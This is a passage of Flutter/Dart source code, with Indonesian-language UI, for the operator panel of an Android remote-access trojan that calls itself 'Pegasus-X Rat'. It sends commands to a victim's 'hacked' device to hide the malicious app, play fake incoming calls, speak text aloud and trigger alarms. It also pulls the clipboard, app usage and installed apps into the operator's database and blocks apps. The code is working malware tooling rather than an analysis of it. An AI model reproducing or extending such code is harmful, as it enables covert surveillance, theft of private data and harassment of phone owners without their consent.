            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white54, fontSize: 11))),
          TextButton(
            onPressed: () { Navigator.pop(context); _sendCommand('hide_app', {'hide': true}); },
            child: const Text('SEMBUNYIKAN', style: TextStyle(fontFamily: 'Orbitron', color: Color(0xFF6B7280), fontSize: 11, letterSpacing: 1))),
          TextButton(
            onPressed: () { Navigator.pop(context); _sendCommand('hide_app', {'hide': false}); },
            child: const Text('TAMPILKAN', style: TextStyle(fontFamily: 'Orbitron', color: _green, fontSize: 11, letterSpacing: 1))),
        ],
      ),
    );
  }

  
  void _showWallpaperDialog() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _WallpaperSheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onSent: (msg) => _snack(msg, isSuccess: true),
        onError: (msg) => _snack(msg, isError: true),
      ),
    );
  }

  void _showVibrateDialog() {
    String selectedPattern = 'single';
    int durationSec = 2;
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setS) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: BoxDecoration(
              color: const Color(0xFF0D1F35),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border.all(color: _purple.withOpacity(0.3))),
            padding: const EdgeInsets.fromLTRB(24, 24, 24, 32),
            child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
              Center(child: Container(width: 40, height: 4,
                decoration: BoxDecoration(color: _purple.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
              const SizedBox(height: 20),
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: _purple.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.4))),
                  child: Center(child: SvgPicture.string(AppSvgIcons.vibration, width: 18, height: 18, colorFilter: const ColorFilter.mode(_purple, BlendMode.srcIn)))),
                const SizedBox(width: 12),
                const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text('GETAR DEVICE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('Pilih Pola Getaran', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple)),
                ]),
              ]),
              const SizedBox(height: 20),
              Text('POLA GETARAN', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
              const SizedBox(height: 10),
              ...[
                {'value': 'single', 'label': 'Single (1x)', 'desc': 'Getar sekali'},
                {'value': 'double', 'label': 'Double (2x)', 'desc': 'Getar dua kali'},
                {'value': 'sos',    'label': 'SOS Pattern', 'desc': '... --- ...'},
              ].map((p) => GestureDetector(
                onTap: () => setS(() => selectedPattern = p['value']!),
                child: Container(
                  margin: const EdgeInsets.only(bottom: 8),
                  padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                  decoration: BoxDecoration(
                    color: selectedPattern == p['value'] ? _purple.withOpacity(0.2) : const Color(0xFF071525),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: selectedPattern == p['value'] ? _purple : _purple.withOpacity(0.2))),
                  child: Row(children: [
                    Container(width: 16, height: 16,
                      decoration: BoxDecoration(shape: BoxShape.circle,
                        color: selectedPattern == p['value'] ? _purple : Colors.transparent,
                        border: Border.all(color: _purple))),
                    const SizedBox(width: 12),
                    Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                      Text(p['label']!, style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: Colors.white)),
                      Text(p['desc']!, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white.withOpacity(0.5))),
                    ]),
                  ]),
                ),
              )),
              if (selectedPattern == 'single') ...[
                const SizedBox(height: 8),
                Text('DURASI: ${durationSec}s', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
                Slider(value: durationSec.toDouble(), min: 1, max: 10, divisions: 9,
                  activeColor: _purple, onChanged: (v) => setS(() => durationSec = v.round())),
              ],
              const SizedBox(height: 16),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => Navigator.pop(ctx),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                    child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
                const SizedBox(width: 12),
                Expanded(child: GestureDetector(
                  onTap: () { Navigator.pop(ctx); _sendCommand('vibrate', {'pattern': selectedPattern, 'duration': durationSec * 1000}); },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(12)),
                    child: const Center(child: Text('GETAR!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
              ]),
            ]),
          ),
        ),
      ),
    );
  }

  void _showTtsDialog() {
    final textCtrl = TextEditingController();
    String selectedLang = 'id';
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setS) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: BoxDecoration(
              color: const Color(0xFF0D1F35),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border.all(color: const Color(0xFF06B6D4).withOpacity(0.3))),
            padding: const EdgeInsets.all(24),
            child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
              Center(child: Container(width: 40, height: 4,
                decoration: BoxDecoration(color: const Color(0xFF06B6D4).withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
              const SizedBox(height: 20),
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: const Color(0xFF06B6D4).withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: const Color(0xFF06B6D4).withOpacity(0.4))),
                  child: Center(child: SvgPicture.string(AppSvgIcons.recordVoice, width: 18, height: 18, colorFilter: const ColorFilter.mode(Color(0xFF06B6D4), BlendMode.srcIn)))),
                const SizedBox(width: 12),
                const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text('TEXT TO SPEECH', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('Device Akan Berbicara Keras', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF06B6D4))),
                ]),
              ]),
              const SizedBox(height: 20),
              const Text('BAHASA', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF06B6D4), letterSpacing: 1.5)),
              const SizedBox(height: 8),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => setS(() => selectedLang = 'id'),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: selectedLang == 'id' ? const Color(0xFF06B6D4).withOpacity(0.2) : const Color(0xFF071525),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: selectedLang == 'id' ? const Color(0xFF06B6D4) : const Color(0xFF06B6D4).withOpacity(0.2))),
                    child: const Center(child: Text('🇮🇩 Indonesia', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white)))))),
                const SizedBox(width: 10),
                Expanded(child: GestureDetector(
                  onTap: () => setS(() => selectedLang = 'en'),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: selectedLang == 'en' ? const Color(0xFF06B6D4).withOpacity(0.2) : const Color(0xFF071525),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: selectedLang == 'en' ? const Color(0xFF06B6D4) : const Color(0xFF06B6D4).withOpacity(0.2))),
                    child: const Center(child: Text('🇬🇧 English', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white)))))),
              ]),
              const SizedBox(height: 16),
              const Text('TEKS YANG AKAN DIBACAKAN', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF06B6D4), letterSpacing: 1.5)),
              const SizedBox(height: 6),
              Container(
                decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(12), border: Border.all(color: const Color(0xFF06B6D4).withOpacity(0.3))),
                child: TextField(
                  controller: textCtrl, maxLines: 3,
                  style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 13),
                  decoration: InputDecoration(border: InputBorder.none, contentPadding: const EdgeInsets.all(14),
                    hintText: 'Masukkan Teks Yang Akan Diucapkan Device...',
                    hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 11, fontFamily: 'ShareTechMono')),
                ),
              ),
              const SizedBox(height: 16),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => Navigator.pop(ctx),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                    child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
                const SizedBox(width: 12),
                Expanded(child: GestureDetector(
                  onTap: () {
                    final text = textCtrl.text.trim();
                    if (text.isEmpty) { _snack('Teks Tidak Boleh Kosong'); return; }
                    Navigator.pop(ctx);
                    _sendCommand('tts', {'text': text, 'lang': selectedLang});
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [Color(0xFF06B6D4), Color(0xFF0891B2)]), borderRadius: BorderRadius.circular(12)),
                    child: const Center(child: Text('BICARAKAN!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
              ]),
            ]),
          ),
        ),
      ),
    );
  }

  void _showSoundDialog() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _SoundSheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onSent: (msg) => _snack(msg, isSuccess: true),
        onError: (msg) => _snack(msg, isError: true),
      ),
    );
  }

  
  void _showFakeCallDialog() {
    final nameCtrl   = TextEditingController(text: 'Mama');
    final numberCtrl = TextEditingController(text: '081234567890');
    const callColor  = Color(0xFF22D3EE);
    showModalBottomSheet(
      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(builder: (ctx, setS) => Padding(
        padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
        child: Container(
          decoration: BoxDecoration(color: const Color(0xFF0D1F35), borderRadius: const BorderRadius.vertical(top: Radius.circular(24)), border: Border.all(color: callColor.withOpacity(0.3))),
          padding: const EdgeInsets.fromLTRB(24, 20, 24, 36),
          child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
            Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: callColor.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
            const SizedBox(height: 20),
            Row(children: [
              Container(width: 36, height: 36, decoration: BoxDecoration(color: callColor.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: callColor.withOpacity(0.4))), child: Center(child: SvgPicture.string(AppSvgIcons.call, width: 18, height: 18, colorFilter: ColorFilter.mode(callColor, BlendMode.srcIn)))),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('FAKE CALL', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                Text('Target: ${_selectedDeviceName ?? "Device"}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: callColor)),
              ]),
            ]),
            const SizedBox(height: 20),
            const Text('NAMA PEMANGGIL', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: callColor, letterSpacing: 1.5)),
            const SizedBox(height: 6),
            Container(
              decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(10), border: Border.all(color: callColor.withOpacity(0.3))),
              child: TextField(controller: nameCtrl, style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(border: InputBorder.none, contentPadding: EdgeInsets.symmetric(horizontal: 14, vertical: 12), hintText: 'Contoh: Mama', hintStyle: TextStyle(color: Colors.white24, fontSize: 11)))),
            const SizedBox(height: 12),
            const Text('NOMOR TELEPON', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: callColor, letterSpacing: 1.5)),
            const SizedBox(height: 6),
            Container(
              decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(10), border: Border.all(color: callColor.withOpacity(0.3))),
              child: TextField(controller: numberCtrl, keyboardType: TextInputType.phone, style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(border: InputBorder.none, contentPadding: EdgeInsets.symmetric(horizontal: 14, vertical: 12), hintText: '081234567890', hintStyle: TextStyle(color: Colors.white24, fontSize: 11)))),
            const SizedBox(height: 20),
            Row(children: [
              Expanded(child: GestureDetector(onTap: () => Navigator.pop(ctx), child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))), child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
              const SizedBox(width: 12),
              Expanded(child: GestureDetector(
                onTap: () {
                  Navigator.pop(ctx);
                  _sendCommand('fake_call', {'callerName': nameCtrl.text.trim(), 'callerNumber': numberCtrl.text.trim(), 'ringDuration': 30000});
                },
                child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: BoxDecoration(gradient: const LinearGradient(colors: [callColor, Color(0xFF0891B2)]), borderRadius: BorderRadius.circular(12)), child: const Center(child: Text('PANGGIL!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
            ]),
          ]),
        ),
      )),
    );
  }

  
  void _showClipboardDialog() {
    if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
    setState(() { _fetchingClipboard = true; _lastClipboard = null; });
    _sendCommand('get_clipboard', {}).then((_) {
      int tries = 0;
      _clipboardTimer?.cancel();
      _clipboardTimer = Timer.periodic(const Duration(seconds: 2), (t) async {
        tries++;
        if (tries > 15) { t.cancel(); if (mounted) setState(() => _fetchingClipboard = false); return; }
        try {
          final res = await ApiService.get('/api/hacked/clipboard-result/$_selectedDeviceId');
          if (res['success'] == true && res['clipboard'] != null) {
            t.cancel();
            final cb = res['clipboard'] as Map<String, dynamic>;
            if (mounted) {
              setState(() { _lastClipboard = cb; _fetchingClipboard = false; });
              _snack('📋 Clipboard Berhasil Di Ambil — Silahkan Masuk Ke Database', isSuccess: true);
              showModalBottomSheet(
                context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
                builder: (ctx) => _ClipboardSheet(
                  deviceId: _selectedDeviceId!,
                  deviceName: _selectedDeviceName ?? 'Device',
                  clipboardData: cb,
                  onSnack: (msg, {bool isError = false}) => _snack(msg, isError: isError)),
              );
            }
          }
        } catch (_) {}
      });
    });
  }

  
  void _showAppUsageDialog() {
    _sendCommand('get_app_usage', {});
    showModalBottomSheet(
      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
      builder: (ctx) => _AppUsageSheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onDataReceived: () => _snack('📊 App Usage Berhasil Di Ambil — Silahkan Masuk Ke Database', isSuccess: true),
      ),
    );
  }

  
  void _showTimeLimitDialog() {
    final pkgCtrl = TextEditingController();
    int limitMinutes = 60;
    const limitColor = Color(0xFFF97316);
    showModalBottomSheet(
      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(builder: (ctx, setS) => Padding(
        padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
        child: Container(
          decoration: BoxDecoration(color: const Color(0xFF0D1F35), borderRadius: const BorderRadius.vertical(top: Radius.circular(24)), border: Border.all(color: limitColor.withOpacity(0.3))),
          padding: const EdgeInsets.fromLTRB(24, 20, 24, 36),
          child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
            Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: limitColor.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
            const SizedBox(height: 20),
            Row(children: [
              Container(width: 36, height: 36, decoration: BoxDecoration(color: limitColor.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: limitColor.withOpacity(0.4))), child: Center(child: SvgPicture.string(AppSvgIcons.timer, width: 18, height: 18, colorFilter: ColorFilter.mode(limitColor, BlendMode.srcIn)))),
              const SizedBox(width: 12),
              const Text('BATASI WAKTU APP', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
            ]),
            const SizedBox(height: 20),
            const Text('PACKAGE NAME (Contoh: com.whatsapp)', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: limitColor, letterSpacing: 1)),
            const SizedBox(height: 6),
            Container(
              decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(10), border: Border.all(color: limitColor.withOpacity(0.3))),
              child: TextField(controller: pkgCtrl, style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 12),
                decoration: const InputDecoration(border: InputBorder.none, contentPadding: EdgeInsets.symmetric(horizontal: 14, vertical: 12), hintText: 'Com.whatsapp', hintStyle: TextStyle(color: Colors.white24, fontSize: 11)))),
            const SizedBox(height: 16),
            Text('BATAS WAKTU: $limitMinutes menit', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: limitColor, letterSpacing: 1.5)),
            Slider(value: limitMinutes.toDouble(), min: 5, max: 240, divisions: 47, activeColor: limitColor, onChanged: (v) => setS(() => limitMinutes = v.round())),
            const SizedBox(height: 12),
            Row(children: [
              Expanded(child: GestureDetector(onTap: () => Navigator.pop(ctx), child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))), child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
              const SizedBox(width: 12),
              Expanded(child: GestureDetector(
                onTap: () {
                  final pkg = pkgCtrl.text.trim();
                  if (pkg.isEmpty) { _snack('Package Name Wajib Diisi'); return; }
                  Navigator.pop(ctx);
                  _sendCommand('set_time_limit', {'packageName': pkg, 'limitMs': limitMinutes * 60 * 1000});
                },
                child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: BoxDecoration(gradient: LinearGradient(colors: [limitColor, const Color(0xFFEA580C)]), borderRadius: BorderRadius.circular(12)), child: const Center(child: Text('TERAPKAN', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
            ]),
          ]),
        ),
      )),
    );
  }

  
  void _showBlockAppDialog() {
    if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
    if (_appList.isEmpty) {
      
      setState(() => _loadingAppList = true);
      _sendCommand('get_app_list', {}).then((_) {
        Future.delayed(const Duration(seconds: 3), () async {
          int tries = 0;
          while (tries < 10) {
            tries++;
            try {
              final res = await ApiService.get('/api/hacked/app-list/$_selectedDeviceId?launchable=true');
              if (res['success'] == true && res['apps'] != null) {
                final apps = List<Map<String, dynamic>>.from(res['apps'] ?? []);
                if (mounted) {
                  setState(() { _appList = apps; _loadingAppList = false; });
                  _showBlockAppSheet(apps);
                }
                return;
              }
            } catch (_) {}
            await Future.delayed(const Duration(seconds: 2));
          }
          if (mounted) setState(() => _loadingAppList = false);
        });
      });
      return;
    }
    _showBlockAppSheet(_appList);
  }

  void _showBlockAppSheet(List<Map<String, dynamic>> apps) {
    const blockColor = Color(0xFFEF4444);
    final searchCtrl = TextEditingController();
    showModalBottomSheet(
      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(builder: (ctx, setLocal) {
        final query    = searchCtrl.text.toLowerCase();
        final filtered = query.isEmpty ? apps
          : apps.where((a) => (a['appName'] as String).toLowerCase().contains(query) ||
                               (a['packageName'] as String).toLowerCase().contains(query)).toList();
        return Container(
          height: MediaQuery.of(ctx).size.height * 0.85,
          decoration: BoxDecoration(color: AppTheme.darkBg, borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: blockColor.withOpacity(0.3))),
          child: Column(children: [
            Container(width: 40, height: 4, margin: const EdgeInsets.symmetric(vertical: 12),
              decoration: BoxDecoration(color: Colors.white24, borderRadius: BorderRadius.circular(2))),
            Padding(padding: const EdgeInsets.symmetric(horizontal: 20),
              child: Row(children: [
                SvgPicture.string(AppSvgIcons.block, width: 18, height: 18, colorFilter: ColorFilter.mode(blockColor, BlendMode.srcIn)),
                const SizedBox(width: 10),
                Expanded(child: Text('BLOKIR APLIKASI (${apps.length})',
                  style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: Colors.white, letterSpacing: 2))),
              ])),
            const SizedBox(height: 12),
            Padding(padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Container(
                decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: blockColor.withOpacity(0.3))),
                child: TextField(
                  controller: searchCtrl,
                  onChanged: (_) => setLocal(() {}),
                  style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white),
                  decoration: InputDecoration(
                    hintText: 'Cari Nama App / Package...',
                    hintStyle: TextStyle(color: Colors.white30, fontFamily: 'ShareTechMono', fontSize: 11),
                    prefixIcon: Padding(
                      padding: const EdgeInsets.symmetric(horizontal: 12),
                      child: SvgPicture.string(AppSvgIcons.search, width: 16, height: 16, colorFilter: ColorFilter.mode(blockColor.withOpacity(0.6), BlendMode.srcIn))),
                    prefixIconConstraints: const BoxConstraints(minWidth: 44, minHeight: 44),
                    border: InputBorder.none, contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 12))))),
            const SizedBox(height: 8),
            Expanded(child: ListView.builder(
              padding: const EdgeInsets.fromLTRB(16, 0, 16, 20),
              itemCount: filtered.length,
              itemBuilder: (_, i) {
                final app = filtered[i];
                final name = app['appName'] as String? ?? 'Unknown';
                final pkg  = app['packageName'] as String? ?? '';
                final isSys = app['isSystem'] as bool? ?? false;
                return GestureDetector(
                  onTap: () {
                    Navigator.pop(ctx);
                    _showBlockAppConfirm(name, pkg);
                  },
                  child: Container(
                    margin: const EdgeInsets.only(bottom: 8),
                    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                    decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: blockColor.withOpacity(0.15))),
                    child: Row(children: [
                      Container(width: 36, height: 36,
                        decoration: BoxDecoration(color: blockColor.withOpacity(0.1), borderRadius: BorderRadius.circular(8),
                          border: Border.all(color: blockColor.withOpacity(0.3))),
                        child: Center(child: Text(name.isNotEmpty ? name[0].toUpperCase() : '?',
                          style: TextStyle(fontFamily: 'Orbitron', fontSize: 14, color: blockColor, fontWeight: FontWeight.bold)))),
                      const SizedBox(width: 12),
                      Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                        Text(name, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 2),
                        Text(pkg, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white38), overflow: TextOverflow.ellipsis),
                      ])),
                      if (isSys) Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                        decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(4)),
                        child: const Text('SYS', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: Colors.white30))),
                      const SizedBox(width: 6),
                      SvgPicture.string(AppSvgIcons.block, width: 16, height: 16, colorFilter: ColorFilter.mode(blockColor.withOpacity(0.5), BlendMode.srcIn)),
                    ])));
              })),
          ]));
      }),
    );
  }

  void _showBlockAppConfirm(String name, String pkg) {
    const blockColor = Color(0xFFEF4444);
    const _green = Color(0xFF10B981);
    showDialog(context: context, builder: (ctx) => AlertDialog(
      backgroundColor: AppTheme.darkBg,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: blockColor.withOpacity(0.4))),
      title: Row(children: [
        SvgPicture.string(AppSvgIcons.block, width: 18, height: 18, colorFilter: ColorFilter.mode(blockColor, BlendMode.srcIn)),
        const SizedBox(width: 10),
        const Text('Blokir App', style: TextStyle(fontFamily: 'Orbitron', fontSize: 14, color: Colors.white)),
      ]),
      content: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text('Pilih aksi untuk "$name":',
          style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white70)),
        const SizedBox(height: 4),
        Text(pkg, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white30)),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(ctx), 
          child: const Text('Batal', style: TextStyle(color: Colors.white38))),
        TextButton(
          onPressed: () { 
            Navigator.pop(ctx); 
            _sendCommand('block_app', {'packageName': pkg, 'block': true}); 
            _snack('Blokir "$name" terkirim!', isSuccess: true);
          },
          child: const Text('BLOKIR', style: TextStyle(color: blockColor, fontFamily: 'Orbitron', fontWeight: FontWeight.bold))),
        TextButton(
          onPressed: () { 
            Navigator.pop(ctx); 
            _sendCommand('block_app', {'packageName': pkg, 'block': false}); 
            _snack('Unblok "$name" terkirim!', isSuccess: true);
          },
          child: const Text('UNBLOK', style: TextStyle(color: _green, fontFamily: 'Orbitron', fontWeight: FontWeight.bold))),
      ]));
  }

  
  void _showTriggerAlarmDialog() {
    final msgCtrl = TextEditingController(text: 'Pegasus-X Rat Ni Dek😹');
    int durationSec = 10;
    const alarmColor = Color(0xFFFFD700);
    showModalBottomSheet(
      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(builder: (ctx, setS) => Padding(
        padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
        child: Container(
          decoration: BoxDecoration(color: const Color(0xFF0D1F35), borderRadius: const BorderRadius.vertical(top: Radius.circular(24)), border: Border.all(color: alarmColor.withOpacity(0.3))),
          padding: const EdgeInsets.fromLTRB(24, 20, 24, 36),
          child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
            Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: alarmColor.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
            const SizedBox(height: 20),
            Row(children: [
              Container(width: 36, height: 36, decoration: BoxDecoration(color: alarmColor.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: alarmColor.withOpacity(0.4))), child: Center(child: SvgPicture.string(AppSvgIcons.alarm, width: 18, height: 18, colorFilter: ColorFilter.mode(alarmColor, BlendMode.srcIn)))),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('TRIGGER ALARM', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                Text('Target: ${_selectedDeviceName ?? "Device"}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: alarmColor)),
              ]),
            ]),
            const SizedBox(height: 20),
            const Text('PESAN ALARM', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: alarmColor, letterSpacing: 1.5)),
            const SizedBox(height: 6),
            Container(
              decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(10), border: Border.all(color: alarmColor.withOpacity(0.3))),
              child: TextField(controller: msgCtrl, style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 12),
                decoration: const InputDecoration(border: InputBorder.none, contentPadding: EdgeInsets.symmetric(horizontal: 14, vertical: 12)))),
            const SizedBox(height: 16),
            Text('DURASI: ${durationSec}s', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: alarmColor, letterSpacing: 1.5)),
